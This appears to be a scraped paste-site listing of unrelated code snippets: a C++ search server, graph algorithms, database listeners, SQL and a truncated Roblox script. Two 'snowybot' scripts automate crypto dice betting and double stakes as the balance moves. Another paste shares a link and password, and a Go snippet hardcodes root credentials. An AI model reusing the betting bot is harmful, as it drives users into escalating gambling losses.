vector<string> SplitIntoWords(const string& text) {
    vector<string> words;
    string word;
    for (const char c : text) {
        if (c == ' ') {
            if (!word.empty()) {
                words.push_back(word);
                word.clear();
            }
        } else {
            word += c;
        }
    }
    if (!word.empty()) {
        words.push_back(word);
    }

    return words;
}

struct Document {
    Document()= default;

    Document(int id, double rel, int rat):
    id(id), relevance(rel), rating(rat)
    {}
    int id = 0;
    double relevance = 0;
    int rating = 0;
};

enum class DocumentStatus {
    ACTUAL,
    IRRELEVANT,
    BANNED,
    REMOVED,
};

class SearchServer {
public:

    // Defines an invalid document id
    // You can refer to this constant as SearchServer::INVALID_DOCUMENT_ID
    inline static constexpr int INVALID_DOCUMENT_ID = -1;

    SearchServer(){
        stop_words_.insert(""""); 
    }

    template <typename StringCollection>
        explicit SearchServer(const StringCollection& stop_words) {
        for (const auto& element: stop_words){
            stop_words_.emplace(element); 
        }
    }

    explicit SearchServer(const string& stop_words_text):SearchServer(SplitIntoWords(stop_words_text)){}

    void SetStopWords(const string& text) {
        for (const string& word : SplitIntoWords(text)) {
            stop_words_.insert(word);
        }
    }

    [[nodiscard]] bool AddDocument(int document_id, const string& document, DocumentStatus status, const vector<int>& ratings) {
        
        if (document_id < 0 || documents_.count(document_id) > 0) {
            return false;
        }

        const vector<string> words = SplitIntoWordsNoStop(document);
        const double inv_word_count = 1.0 / words.size();
        for (const string& word : words) {
            if (!IsValidWord(word)) {
                return false;
            }
            word_to_document_freqs_[word][document_id] += inv_word_count;
        }
        documents_.emplace(document_id, DocumentData{ComputeAverageRating(ratings), status});

        document_index_.push_back(document_id);
        ++document_count_;
        return true;
    }

    //  [[nodiscard]] bool FindTopDocuments(const string& raw_query, DocumentStatus doc_status = DocumentStatus::ACTUAL,  vector<Document>& result) const{
            
    //         if (FindTopDocuments(
    //         raw_query, [doc_status](int document_id, DocumentStatus document_status, int rating) {
    //             return document_status == doc_status;
    //         }, result)) {
    //             return true;
    //         }
    //     // return false;
    //     //     return FindTopDocuments(raw_query, [doc_status](int document_id, DocumentStatus status, int rating,  vector<Document>& result) { return status == doc_status; });
    // }

    // vector<Document> FindTopDocuments(const string& raw_query) const {
    //     return FindTopDocuments(raw_query, [](int document_id, DocumentStatus status, int rating) { return status == DocumentStatus::ACTUAL; });
    // }

    template <typename DocumentPredicate>
    [[nodiscard]] bool FindTopDocuments(const string& raw_query, DocumentPredicate document_predicate,
                                        vector<Document>& result) const {
        Query query;
        bool query_parsing_result = ParseQuery(raw_query, query);
        if (!query_parsing_result) {
            return false;
        }
        //const Query query = ParseQuery(raw_query);
        auto matched_documents = FindAllDocuments(query, document_predicate);

        sort(matched_documents.begin(), matched_documents.end(),
             [](const Document& lhs, const Document& rhs) {
                if (abs(lhs.relevance - rhs.relevance) < std::numeric_limits<double>::epsilon()) {
                    return lhs.rating > rhs.rating;
                }
                return lhs.relevance > rhs.relevance;
                 
             });
        if (matched_documents.size() > MAX_RESULT_DOCUMENT_COUNT) {
            matched_documents.resize(MAX_RESULT_DOCUMENT_COUNT);
        }
        // return matched_documents;
        
        if (matched_documents.empty()) {
            return false;
        }
        result = matched_documents;
        return true;
    }

    [[nodiscard]] bool FindTopDocuments(const string& raw_query, DocumentStatus status,
                                        vector<Document>& result) const {
        if (FindTopDocuments(
            raw_query, [status](int document_id, DocumentStatus document_status, int rating) {
                return document_status == status;
            }, result)) {
                return true;
            }
        return false;
    }
    [[nodiscard]] bool FindTopDocuments(const string& raw_query, vector<Document>& result) const {
        DocumentStatus status = DocumentStatus::ACTUAL;
        if (FindTopDocuments(
            raw_query, [status](int document_id, DocumentStatus document_status, int rating) {
                return document_status == status;
            }, result)) {
                return true;
            }
        return false;
    }

    int GetDocumentCount() const {
        return documents_.size();
    }

    [[nodiscard]] bool MatchDocument(const string& raw_query, int document_id,
                                     tuple<vector<string>, DocumentStatus>& result) const {
        
        //const Query query = ParseQuery(raw_query);
        Query query;
        bool query_parsing_result = ParseQuery(raw_query, query);
        if (!query_parsing_result) {
            return false;
        }
        vector<string> matched_words;
        for (const string& word : query.plus_words) {
            if (word_to_document_freqs_.count(word) == 0) {
                continue;
            }
            if (word_to_document_freqs_.at(word).count(document_id)) {
                matched_words.push_back(word);
            }
        }
        for (const string& word : query.minus_words) {
            if (word_to_document_freqs_.count(word) == 0) {
                continue;
            }
            if (word_to_document_freqs_.at(word).count(document_id)) {
                matched_words.clear();
                break;
            }
        }
        //return {matched_words, documents_.at(document_id).status};

        
        if (matched_words.empty()) {
            return false;
        }
        result = {matched_words, documents_.at(document_id).status};
        return true;
    }

    int GetDocumentId(int index) const {
    
        if ((index<0 || index >= document_count_) || document_index_.empty()){
            // cerr << ""Индекс переданного документа выходит за пределы допустимого диапазона (0; количество документов)""s << endl;
            return SearchServer::INVALID_DOCUMENT_ID;

        } else{
            return document_index_.at(index);
        }
    }

private:
    struct DocumentData {
        int rating;
        DocumentStatus status;
    };

    set<string> stop_words_;
    map<string, map<int, double>> word_to_document_freqs_;
    map<int, DocumentData> documents_;

    bool IsStopWord(const string& word) const {
        return stop_words_.count(word) > 0;
    }

    vector<string> SplitIntoWordsNoStop(const string& text) const {
        vector<string> words;
        for (const string& word : SplitIntoWords(text)) {
            if (!IsStopWord(word)) {
                // if (!IsValidWord(word)){
                //     cerr << ""Документ содержит недопустимы символы"" << endl;

                // }
                words.push_back(word);
            }
        }
        return words;
    }

    static int ComputeAverageRating(const vector<int>& ratings) {
        if (ratings.empty()) {
            return 0;
        }
        //cd int rating_sum = accumulate(ratings.begin(), ratings.end(), 0);
        // for (const int rating : ratings) {
        //     rating_sum += rating;
        // }

        return accumulate(ratings.begin(), ratings.end(), 0) / static_cast<int>(ratings.size());
    }

    static bool IsValidWord(const string& word) {
        // A valid word must not contain special characters
        return none_of(word.begin(), word.end(), [](char c) {
            return c >= '\0' && c < ' ';
        });
    }

    struct QueryWord {
        string data;
        bool is_minus;
        bool is_stop;
    };

    [[nodiscard]] bool ParseQueryWord(string text, QueryWord& result) const {
        bool is_minus = false;
        // Word shouldn't be empty
        if (text[0] == '-') {
            is_minus = true;
            text = text.substr(1);
        }
    if (text.empty()){
        // cerr << ""Задано пустое минус-слово кот -""s << endl;
        return false;
    }
    if (text.at(0) == '-'){
        // cerr << ""Минус слова заданы не верно --кот""s << endl;
        return false;
    }
        result.data = text;
        result.is_minus = is_minus;
        result.is_stop = IsStopWord(text);
        // return {text, is_minus, IsStopWord(text)};
        return true;
    }

    struct Query {
        set<string> plus_words;
        set<string> minus_words;
    };

    int document_count_ = 0;
    std::vector <int> document_index_;

    [[nodiscard]] bool ParseQuery(const string& text, Query &parse_query_result) const {
        //Query query;
        for (const string& word : SplitIntoWords(text)) {
            if (!IsValidWord(word)){
                return false;
                // cerr << ""Некорректный символ в запросе""s << endl;
             }
            QueryWord query_word;
            bool query_parsing_result = ParseQueryWord(word, query_word);
            if (!IsValidWord(query_word.data) || !query_parsing_result) {
                return false;
            }
            if (!query_word.is_stop) {
                if (query_word.is_minus) {
                    parse_query_result.minus_words.insert(query_word.data);
                } else {
                    parse_query_result.plus_words.insert(query_word.data);
                }
            }
        }
        //return query;
        return true;
    }

    // Existence required
    double ComputeWordInverseDocumentFreq(const string& word) const {
        return log(GetDocumentCount() * 1.0 / word_to_document_freqs_.at(word).size());
    }

    
   // Шаблонная функция с функциональным параметром
    template <typename Predicate>
    vector<Document> FindAllDocuments(const Query& query, Predicate predicate) const {
        map<int, double> document_to_relevance;
        for (const string& word : query.plus_words) {
            if (word_to_document_freqs_.count(word) == 0) {
                continue;
            }
            const double inverse_document_freq = ComputeWordInverseDocumentFreq(word);
            for (const auto &[document_id, term_freq] : word_to_document_freqs_.at(word)) {
                
                // Будем считать TF-IDF только для документов, удовлетвлетворяющие предикату
                auto doc_status = documents_.at(document_id).status;
                auto doc_rating = documents_.at(document_id).rating;

                if (predicate(document_id, doc_status, doc_rating)) {
                    document_to_relevance[document_id] += term_freq * inverse_document_freq;
                }
            }
        }

        for (const string& word : query.minus_words) {
            if (word_to_document_freqs_.count(word) == 0) {
                continue;
            }
            for (const auto &[document_id, _] : word_to_document_freqs_.at(word)) {
                document_to_relevance.erase(document_id);
            }
        }

        vector<Document> matched_documents;
        for (const auto &[document_id, relevance] : document_to_relevance) {
            matched_documents.push_back(
                {document_id, relevance, documents_.at(document_id).rating});
        }
        return matched_documents;
    }
};

void PrintDocument(const Document& document) {
    cout << ""{ ""s
         << ""document_id = ""s << document.id << "", ""s
         << ""relevance = ""s << document.relevance << "", ""s
         << ""rating = ""s << document.rating
         << "" }""s << endl;
}



int main() {
    SearchServer search_server(""и в на""s);
    // Явно игнорируем результат метода AddDocument, чтобы избежать предупреждения
    // о неиспользуемом результате его вызова
    (void) search_server.AddDocument(1, ""пушистый кот пушистый хвост""s, DocumentStatus::ACTUAL, {7, 2, 7});


    
    if (!search_server.AddDocument(1, ""пушистый пёс и модный ошейник""s, DocumentStatus::ACTUAL, {1, 2})) {
        cout << ""Документ не был добавлен, так как его id совпадает с уже имеющимся""s << endl;
    }
    if (!search_server.AddDocument(-1, ""пушистый пёс и модный ошейник""s, DocumentStatus::ACTUAL, {1, 2})) {
        cout << ""Документ не был добавлен, так как его id отрицательный""s << endl;
    }
    if (!search_server.AddDocument(3, ""большой пёс скво\x12рец""s, DocumentStatus::ACTUAL, {1, 3, 2})) {
        cout << ""Документ не был добавлен, так как содержит спецсимволы""s << endl;
    }
    // vector<Document> documents;
    // if (search_server.FindTopDocuments(""--пушистый""s, documents)) {
    //     for (const Document& document : documents) {
    //         PrintDocument(document);
    //     }
    // } else {
    //     cout << ""Ошибка в поисковом запросе""s << endl;
    // }

    vector<Document> documents;
    if (search_server.FindTopDocuments("" на""s, documents)) {
        for (const Document& document : documents) {
            PrintDocument(document);
        }
    } else {
        cout << ""Ошибка в поисковом запросе""s << endl;
    }
} "
Z9a3CrHq,useAsyncEffect,Neko250,TypeScript,Monday 20th of May 2024 04:06:30 AM CDT,"import { useEffect } from 'react'

interface UseAsyncEffect {
  (
    effect: (isMounted: () => boolean) => unknown | Promise<unknown>,
    inputs?: any[]
  ): void

  <V>(
    effect: (isMounted: () => boolean) => V | Promise<V>,
    destroy?: (result?: V) => void,
    inputs?: any[]
  ): void
}

export const useAsyncEffect: UseAsyncEffect = (effect, destroy, inputs) => {
  useEffect(
    () => {
      let result
      let mounted = true
      let maybePromise = effect(() => mounted)

      Promise.resolve(maybePromise).then(value => (result = value))

      return () => {
        mounted = false
        if (typeof destroy === 'function') destroy(result)
      }
    },

    // eslint-disable-next-line react-hooks/exhaustive-deps
    typeof destroy === 'function' ? inputs : destroy
  )
}

export default useAsyncEffect
"
X6KpqVdf,delo-vcusa.ru: sticky,Luxup,JavaScript,Monday 20th of May 2024 03:53:25 AM CDT,"var shb = document.querySelector('.essb-mobile-sharebottom');
show(shb);
adjustIngredientsPosition();
updateBottomPosition();

waitForElm('.bs6').then((elm) => {
    const ro = new ResizeObserver(entries => {
        for (let entry of entries) {
            updateButtonsPosition();
            adjustIngredientsPosition();
            updateBottomPosition(); 
        }
    });
    ro.observe(elm);
});

function waitForElm(selector) {
    return new Promise(resolve => {
        if (document.querySelector(selector)) {
            return resolve(document.querySelector(selector));
        }

        const observer = new MutationObserver(mutations => {
            if (document.querySelector(selector)) {
                resolve(document.querySelector(selector));
                observer.disconnect();
            }
        });

        observer.observe(document.body, {
            childList: true,
            subtree: true
        });
    });
}

function updateBottomPosition() {
    const essbMobileSharebottom = document.querySelector('.essb-mobile-sharebottom');
    const targetElement = document.querySelector('.bs6');
    const fixedIngredients = document.querySelector('.fixed-ingredients.visible');

    if (essbMobileSharebottom && targetElement) {
        let essbHeight = essbMobileSharebottom.offsetHeight;
        if (fixedIngredients) {
            essbHeight += fixedIngredients.offsetHeight;
        }
        targetElement.style.bottom = `${essbHeight}px`;
    }
}

const observer = new MutationObserver(mutations => {
    mutations.forEach(mutation => {
        if (mutation.target.classList.contains('fixed-ingredients')) {
            updateBottomPosition();
        }
    });
});

observer.observe(document.body, {
    attributes: true,
    subtree: true,
    attributeFilter: ['class']
});
"
aC9qcD4k,xy_vss,kub3,C++,Monday 20th of May 2024 02:57:37 AM CDT,"#include <iostream>
#include <vector>
#include <queue>
#include <algorithm>
#include <climits>
#include <fstream>

using namespace std;

struct FlowEdge
{
    int v, u;
    long long cap, flow;
    FlowEdge(int v, int u, long long cap) : v(v), u(u), cap(cap), flow(0) {}
};

struct Dinic
{
    const long long flow_inf = LLONG_MAX;
    vector<FlowEdge> edges;
    vector<vector<int>> adj;
    int n, m = 0;
    int s, t;
    vector<int> level, ptr;
    queue<int> q;

    Dinic(int n, int s, int t) : n(n), s(s), t(t)
    {
        adj.resize(n);
        level.resize(n);
        ptr.resize(n);
    }

    void add_edge(int v, int u, long long cap)
    {
        edges.emplace_back(v, u, cap);
        edges.emplace_back(u, v, 0);
        adj[v].push_back(m);
        adj[u].push_back(m + 1);
        m += 2;
    }

    bool bfs()
    {
        while (!q.empty())
        {
            int v = q.front();
            q.pop();
            for (int id : adj[v])
            {
                int u = edges[id].u;
                if (edges[id].cap - edges[id].flow < 1 || level[u] != -1)
                    continue;
                level[u] = level[v] + 1;
                q.push(u);
            }
        }
        return level[t] != -1;
    }

    long long dfs(int v, long long pushed)
    {
        if (pushed == 0)
            return 0;
        if (v == t)
            return pushed;
        for (int &cid = ptr[v]; cid < (int)adj[v].size(); cid++)
        {
            int id = adj[v][cid];
            int u = edges[id].u;
            long long diff_cap_flow = edges[id].cap - edges[id].flow;
            if (level[v] + 1 != level[u] || diff_cap_flow < 1)
                continue;
            long long tr = dfs(u, min(pushed, diff_cap_flow));
            if (tr == 0)
                continue;
            edges[id].flow += tr;
            edges[id ^ 1].flow -= tr;
            // x ^ 1 == x - 1 if x % 2 else x + 1
            // edges[id ^ 1] is inverse edge: (u, v) -- (v, u)
            return tr;
        }
        return 0;
    }

    long long flow()
    {
        long long f = 0;
        while (true)
        {
            fill(level.begin(), level.end(), -1);
            level[s] = 0;
            q.push(s);
            if (!bfs())
                break;

            fill(ptr.begin(), ptr.end(), 0);
            while (long long pushed = dfs(s, flow_inf))
            {
                f += pushed;
            }
        }
        return f;
    }
};

long long build_network_and_find_max_flow(int n, int m, const vector<pair<int, int>> &edges, int x, int y)
{
    int new_n = 2 * (n - 2) + 2; // (v^(0) and v^(1) for each v != x, y) + (x, y)

    vector<int> v0(n, -1), v1(n, -1);
    int idx = 0;
    for (int i = 0; i < n; i++)
    {
        if (i != x && i != y)
        {
            v0[i] = idx++;
            v1[i] = idx++;
        }
    }
    int source = idx++;
    int sink = idx++;

    Dinic dinic(new_n, source, sink);

    for (const auto &e : edges)
    {
        int u = e.first;
        int v = e.second;
        if (u == x || u == y || v == x || v == y)
        {
            if (u == x)
            {
                dinic.add_edge(source, v0[v], dinic.flow_inf);
            }
            else if (u == y)
            {
                dinic.add_edge(v1[v], sink, dinic.flow_inf);
            }
            else if (v == x)
            {
                dinic.add_edge(source, v0[u], dinic.flow_inf);
            }
            else if (v == y)
            {
                dinic.add_edge(v1[u], sink, dinic.flow_inf);
            }
        }
        else
        {
            dinic.add_edge(v1[u], v0[v], dinic.flow_inf);
            dinic.add_edge(v1[v], v0[u], dinic.flow_inf);
        }
    }

    for (int i = 0; i < n; i++)
    {
        if (i != x && i != y)
        {
            dinic.add_edge(v0[i], v1[i], 1);
        }
    }

    return dinic.flow();
}

int main()
{
    ifstream infile(""input.txt"");
    if (!infile)
    {
        cerr << ""Unable to open file input.txt"";
        return 1;
    }

    int n, m;
    // cin >> n >> m;
    infile >> n >> m;

    vector<pair<int, int>> edges(m);
    for (int i = 0; i < m; i++)
    {
        int u, v;
        // cin >> u >> v;
        infile >> u >> v;
        edges[i] = {u - 1, v - 1}; // Convert to 0-based index
    }

    int x, y;
    // cin >> x >> y;
    infile >> x >> y;
    infile.close();

    // Convert to 0-based index
    x--;
    y--;

    long long maxflow = build_network_and_find_max_flow(n, m, edges, x, y);

    cout << maxflow << endl;
    return 0;
}
"
9y59C3wT,mongodb_streams,exapsy,JavaScript,Monday 20th of May 2024 02:42:21 AM CDT,"const { MongoClient } = require('mongodb');

async function listenToChanges() {
  const uri = 'mongodb://yourMongoDBURI';
  const client = new MongoClient(uri);

  try {
    await client.connect();
    const database = client.db('yourDatabase');
    const collection = database.collection('yourCollection');

    const changeStream = collection.watch();

    changeStream.on('change', (change) => {
      console.log('Change detected:', change);
    });
  } finally {
    // Keep the connection open to listen for changes
  }
}

listenToChanges().catch(console.error);"
kyXXPfJh,psql_notify,exapsy,Go,Monday 20th of May 2024 02:40:30 AM CDT,"package main

import (
	""context""
	""fmt""
	""time""

	""github.com/jackc/pgx/v5/pgxpool""
)

const PSQL_HOST = ""postgresql://root:root@mysrv.dev/test""

func main() {
	ctx := context.Background()

	dbconfig, err := pgxpool.ParseConfig(PSQL_HOST)
	if err != nil {
		panic(err)
	}

	pool, err := pgxpool.NewWithConfig(context.Background(), dbconfig)
	if err != nil {
		panic(err)
	}
	// defer pool.Close()

	go func() {
		_, err := pool.Exec(ctx, ""listen test"")
		if err != nil {
			panic(err)
		}

		conn, err := pool.Acquire(ctx)
		if err != nil {
			panic(err)
		}

		fmt.Println(""Listening for notifications"")
		notification, err := conn.Conn().WaitForNotification(ctx)
		if err != nil {
			panic(""Error waiting for notification: "" + err.Error())
		}

		for notification != nil {
			fmt.Println(""Received notification:"", notification)
		}
	}()

	pool.Exec(ctx, ""CREATE TABLE IF NOT EXISTS test (key TEXT PRIMARY KEY, value TEXT)"")
	pool.Exec(ctx, ""INSERT INTO test (key, value) VALUES ('key', 'value')"")
	go func() {
		ticker := time.NewTicker(5 * time.Second)
		for range ticker.C {
			pool.Exec(ctx, ""NOTIFY test"")
		}
	}()

	for {
	}
}
"
kaDh21z9,дейкстра,hpnq,C++,Monday 20th of May 2024 02:40:14 AM CDT,"#include ""bits/stdc++.h""
//speed coding handle

#define mp make_pair
#define cve(tpy) for (auto i : tpy) {for(auto j : i){cout << j << "" "";  }cout << ""\n"";} ;
#define f first
#define s second
#define loop(i, x, n) for (int i = x; i < n; i++)
#define joop(x, n) for (ll j = x; j < n; j++)
#define lp(n) for (ll i = 0; i < n; i++)
#define err cout << ""ERROR"" << endl;
#define all(x) x.begin(), x.end()
#define pb push_back
#define sz(x) x.size()
#define rndm rng()

// types
#define pii pair<int, int>
#define pll pair<ll, ll>
#define vvi vector<vector<int>>
#define vvll vector<vector<ll>>
typedef long long ll;
typedef long double ld;

// types of data
#define inf 1000000000
#define infll 1000000000000000000
#define INF ll(1e9)

#define md 998244353
#define mod 1000000009
//#define K 239017

#define DEBUG 1
using namespace std;
mt19937_64 rng(113113);
uniform_int_distribution<ll> drist;
//const int INF = std::numeric_limits<int>::max();
const int MAX_N = 50;

int N; // количество локаций
float graph[MAX_N][MAX_N]; // матрица смежности
float speed[3]; // скорости роботов

void dijkstra(int start, float dist[], float r_speed) {
    bool visited[MAX_N] = {false};
    for (int i = 0; i < N; ++i) {
        dist[i] = INF;
    }
    dist[start] = 0;

    for (int i = 0; i < N; ++i) {
        int u = -1;
        for (int j = 0; j < N; ++j) {
            if (!visited[j] && (u == -1 || dist[j] < dist[u])) {
                u = j;
            }
        }

        if (dist[u] == INF) break;
        visited[u] = true;

        for (int v = 0; v < N; ++v) {
            if (graph[u][v] && dist[u] + graph[u][v] / r_speed < dist[v]) {
                dist[v] = dist[u] + graph[u][v]/r_speed;
            }
        }
    }
}

int main() {
    freopen(""text.txt"", ""r"", stdin);
    int m;
    cin >> N >> m;

    for (int i = 0; i < N; ++i) {
        for (int j = 0; j < N; ++j) {
            cin >> graph[i][j];
        }
    }

//    int I1, I2, I3;
//    cin >> I1 >> I2 >> I3;
//    cin >> speed[0] >> speed[1] >> speed[2];
    float mind = inf;
    int I[3];
    loop(i, 0, m){
        cin >> I[i];
    }
    loop(i, 0, m){
        cin >> speed[i];
//        speed[i] /=2;
    }
    float distI1[MAX_N], distI2[MAX_N], distI3[MAX_N];
    float d[3][MAX_N];
//    cout << I[0] << "" "";
    loop(i, 0, m){
        dijkstra(I[i], d[i], speed[i]);
    }
//    return 1;
//    err

//    dijkstra(I[0], distI1, (float)speed[0]);
//    dijkstra(I[1], distI2, (float)speed[1]);
//    dijkstra(I[2], distI3, (float)speed[2]);
    loop(p, 0, N) {
        float t[3];
        float middleware = 1;

        loop(i, 0, m){
            float dis = d[i][p];
            t[i] = dis;
            middleware = max(middleware, dis);
        }
        if(t[0] == t[1] or t[0] == t[2] or t[1] == t[2]){
            mind = min(mind, middleware);
        }
        continue;
        float dist1 = d[0][p];
        float dist2 = d[1][p];
        float dist3 = d[2][p];
        if (dist1 == dist2 or dist1 == dist3 or dist2 == dist3) {// если пришли в 1 место в 1 время
            if (dist1 == dist2 and dist2 == dist3) {
                mind = min(mind, dist1); // в 1 месте
            } else {
                mind = min(mind, max(max(dist1, dist2), dist3));
            }
        }
    }
    if(mind == inf){
        cout << ""Never meet\n"";
        return 1;
    }
    cout << ""Min dist for robots:"" << mind << endl;

    return 1;
//    loop(i, 1, 3){
//        loop(j, 1, 3){
//            loop(k, 1, 3){
//                float distI1[MAX_N], distI2[MAX_N], distI3[MAX_N];
////                err
//
//                dijkstra(I1, distI1, (float)i);
//                dijkstra(I2, distI2, (float)j);
//                dijkstra(I3, distI3, (float)k);
//
//                loop(p, 0, N){
//                    float dist1 = distI1[p];
//                    float dist2 = distI2[p];
//                    float dist3 = distI3[p];
//                    if(dist1 == dist2 or dist1 == dist3 or dist2 == dist3){// если пришли в 1 место в 1 время
//                        if(dist1 == dist2 and dist2 == dist3){
//                            mind = min(mind, dist1);
//                        }else{
//                            mind = min(mind, max(max(dist1, dist2), dist3));
//                        }
//                    }
//                }
//            }
//        }
//    }
//    cout << ""Min dist for all robots:"" << mind;

//    if (dist1 == INF && dist2 == INF && dist3 == INF) {
//        std::cout << ""Meeting of all robots is not possible."" << std::endl;
//    } else {
//        int min_dist = std::min({dist1, dist2, dist3});
//        std::cout << ""Minimum distance for all robots to meet: "" << min_dist << std::endl;
//        if (min_dist == dist1) {
//            std::cout << ""Shortest path is from robot starting at location "" << I1 << std::endl;
//        } else if (min_dist == dist2) {
//            std::cout << ""Shortest path is from robot starting at location "" << I2 << std::endl;
//        } else {
//            std::cout << ""Shortest path is from robot starting at location "" << I3 << std::endl;
//        }
//    }

    return 0;
}
//int main() {
//    ios::sync_with_stdio(0);
//    cin.tie(0);
//#ifdef DEBUG
////    freopen(""output.txt"", ""w"", stdout);
//#endif
//    solve();
//    return 1;
//}
//
"
aBYvCzuX,youlikehitspass,HendarOfficial,PHP,Monday 20th of May 2024 01:42:42 AM CDT,"Link: https://sfl.gl/v17t 
Pass: vDq8CKePOyUkWnHT6P "
8Fhg5nwe,youlikehits,HendarOfficial,PHP,Monday 20th of May 2024 01:40:51 AM CDT,vDq8CKePOyUkWnHT6P 
SeHBs1BA,RBAC,otkalce,T-SQL,Monday 20th of May 2024 01:06:48 AM CDT,"CREATE TABLE UserRole (
	Id int NOT NULL IDENTITY (1, 1),
	[Name] nvarchar(50) NOT NULL,
	CONSTRAINT PK_UserRole PRIMARY KEY (Id)
)
GO

SET IDENTITY_INSERT UserRole ON
GO

INSERT INTO UserRole (Id, [Name])
VALUES 
	(1, 'Admin'), 
	(2, 'User')
GO

SET IDENTITY_INSERT UserRole OFF
GO

ALTER TABLE [USER] 
ADD RoleId int NULL
GO

UPDATE [USER]
SET RoleId = 2
GO

ALTER TABLE [USER] 
ALTER COLUMN RoleId int NOT NULL
GO

ALTER TABLE dbo.[USER] 
ADD CONSTRAINT FK_USER_UserRole FOREIGN KEY (RoleId) 
REFERENCES dbo.UserRole (Id)
GO
"
8vJw9x08,snowybot private archive released,coinwalk,JavaScript,Monday 20th of May 2024 01:03:17 AM CDT,"var elderly = parseFloat(document.getElementById('pct_balance').value);
var prefit = 0.001;
var beast = prefit;
var tens = (prefit*10);
var hunt = (prefit*100);
var tentyfour = (prefit*64)
var sevens = (prefit*6.9);
var eights = (prefit*7.9);
var winnerdinner = (elderly*24);
var snowie = ((Math.floor(elderly/tens))*tens);
var great = elderly;
var bolux = false;
var upped = 6.9;
var downed = 2.9;
var mighty = elderly;
var baboon = ((Math.floor(elderly/tens))*tens);
var joe = ((Math.floor(elderly/tens))*tens);
 
function go(){
great = Number(document.getElementById('pct_balance').value);
var dog = Number((great-elderly).toFixed(8));
console.log(""profit"");
console.log(dog);
if (great>(snowie+(beast*upped))){
    beast = beast*2;
    upped = 4.9;
    downed = 4.9;
    snowie = parseFloat(great);
}
if (great<(snowie-(beast*downed))){
    beast = beast*2;
    upped = 4.9;
    downed = 4.9;
    snowie = parseFloat(great);
}
if ((great<=(baboon-tentyfour))&&(great<(((Math.floor(great/tens))*tens)+sevens))){
    beast = prefit;
    upped = 6.9;
    downed = 2.9;
    baboon = ((Math.floor(great/tens))*tens);
    snowie = ((Math.floor(great/tens))*tens);
}
if ((great>=(joe+tentyfour))&&(great<(((Math.floor(great/tens))*tens)+sevens))){
    beast = prefit;
    upped = 6.9;
    downed = 2.9;
    baboon = ((Math.floor(great/tens))*tens);
    joe = ((Math.floor(great/tens))*tens);
    snowie = ((Math.floor(great/tens))*tens);
}
if (((great/4)<=beast)&&(great<(((Math.floor(great/tens))*tens)+sevens))){
    beast = prefit;
    upped = 6.9;
    downed = 2.9;
    baboon = ((Math.floor(great/tens))*tens);
    snowie = ((Math.floor(great/tens))*tens);
}
if (((great/4)<=beast)&&(great>(((Math.floor(great/tens))*tens)+eights))){
    beast = prefit;
    upped = 6.9;
    downed = 2.9;
    baboon = ((Math.floor(great/tens))*tens);
    snowie = ((Math.floor(great/tens))*tens);
}
if (((great/4)<=beast)&&(great>(((Math.floor(great/tens))*tens)+sevens))&&(great<(((Math.floor(great/tens))*tens)+eights))){
    beast = prefit*2;
    upped = 4.9;
    downed = 4.9;
    snowie = parseFloat(great);
    baboon = ((Math.floor(great/tens))*tens);
}
if ((great-beast)<=hunt){
console.log(""sorry we busted"");
return;
}
if (great>=winnerdinner){
console.log(""winner winner chicken dinner"");
return;
}
$('#pct_chance').val(49.5);
$('#pct_bet').val(((beast*1).toFixed(8)));
$('#a_lo').click();
setTimeout(() => go(), 1200);
}
go();"
4Yf3Vwgv,snowybot private archive released,coinwalk,JavaScript,Monday 20th of May 2024 12:57:18 AM CDT,"var elderly = parseFloat(document.getElementById('pct_balance').value);
var prefit = 0.001;
var beast = prefit;
var tens = (prefit*10);
var hunt = (prefit*100);
var tentyfour = (prefit*64)
var sevens = (prefit*6.9);
var eights = (prefit*7.9);
var winnerdinner = (elderly*24);
var snowie = ((Math.floor(elderly/tens))*tens);
var great = elderly;
var bolux = false;
var upped = 6.9;
var downed = 2.9;
var mighty = elderly;
var baboon = ((Math.floor(elderly/tens))*tens);
var joe = ((Math.floor(elderly/tens))*tens);
 
function go(){
great = Number(document.getElementById('pct_balance').value);
var dog = Number((great-elderly).toFixed(8));
console.log(""profit"");
console.log(dog);
if (great>(snowie+(beast*upped))){
    beast = beast*2;
    upped = 4.9;
    downed = 4.9;
    snowie = parseFloat(great);
}
if (great<(snowie-(beast*downed))){
    beast = beast*2;
    upped = 4.9;
    downed = 4.9;
    snowie = parseFloat(great);
}
if ((great<=(baboon-tentyfour))&&(great<(((Math.floor(great/tens))*tens)+sevens))){
    beast = prefit;
    upped = 6.9;
    downed = 2.9;
    baboon = ((Math.floor(great/tens))*tens);
    joe = ((Math.floor(great/tens))*tens);
    snowie = ((Math.floor(great/tens))*tens);
}
if ((great>=(joe+tentyfour))&&(great<(((Math.floor(great/tens))*tens)+sevens))){
    beast = prefit;
    upped = 6.9;
    downed = 2.9;
    baboon = ((Math.floor(great/tens))*tens);
    joe = ((Math.floor(great/tens))*tens);
    snowie = ((Math.floor(great/tens))*tens);
}
if ((great-beast)<=hunt){
console.log(""sorry we busted"");
return;
}
if (great>=winnerdinner){
console.log(""winner winner chicken dinner"");
return;
}
$('#pct_chance').val(49.5);
$('#pct_bet').val(((beast*1).toFixed(8)));
$('#a_lo').click();
setTimeout(() => go(), 1200);
}
go();"
pVKXfGZ1,MainScript NEW,Sungmingamerpro13,CSS,Monday 20th of May 2024 12:09:59 AM CDT,"-- Phantom
-- If you named your things the same as in the video then you don't have to rename things.

local StarterGui = game:GetService(""StarterGui"")
local Players = game:GetService(""Players"")
-- No need to touch above

-- You inserted these in ReplicatedStorage
local FrameVisible = game.ReplicatedStorage:FindFirstChild(""FrameVisible"") -- BoolValue
local PlayerImage = game.ReplicatedStorage:FindFirstChild(""PlayerImage"") -- RemoteEvent
local PlayerName = game.ReplicatedStorage:FindFirstChild(""PlayerName"") -- StringValue
local NPCImage = game.ReplicatedStorage:FindFirstChild(""NPCImage"")
local Text = game.ReplicatedStorage:FindFirstChild(""Text"") -- StringValue

local NPC = game.Workspace:FindFirstChild(""NPC"")

local Teleports = game.Workspace:FindFirstChild(""Teleports"")
local Sounds = game.Workspace:FindFirstChild(""Sounds"")
local Checkpoints = game.Workspace:FindFirstChild(""Checkpoints"")

-- Blank variables, do not touch
local RandomPlayer
local Message

function TypeSound()
    local Sound = Instance.new(""Sound"")
    Sound.Parent = game.Workspace
    Sound.Name = ""TypeSound""
    Sound.SoundId = ""http://www.roblox.com/asset/?id=3333976425"" -- You can change the typing sound if you like
    Sound.PlaybackSpeed = 1
    Sound.Volume = 0.5
    Sound:Play()
    coroutine.resume(coroutine.create(function()
        wait(1)
        Sound:Destroy()
    end))
end

function SetText(word)
    Message = word
    for i = 1, #Message do
        Text.Value = string.sub(Message, 1, i)
        TypeSound()
        wait(0.05) -- Time between each letter, 0.05 seconds is recommended. The smaller the faster.
    end
end

function SetNPCText(word)
    Message = word
